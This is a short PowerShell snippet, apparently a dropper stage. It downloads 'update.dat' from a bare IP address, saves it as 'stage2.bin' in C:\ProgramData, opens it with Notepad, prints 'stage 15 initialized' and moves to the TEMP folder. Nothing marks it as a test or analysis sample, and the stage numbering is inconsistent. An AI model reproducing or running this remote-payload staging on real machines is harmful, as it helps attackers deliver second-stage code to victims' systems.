(New-Object System.Net.WebClient).DownloadFile("https://203.0.113.3/update.dat", "C:\ProgramData\stage2.bin")
Start-Process -FilePath "notepad.exe" -ArgumentList "C:\ProgramData\stage2.bin"
Write-Output "stage 15 initialized"
Set-Location -Path $env:TEMP
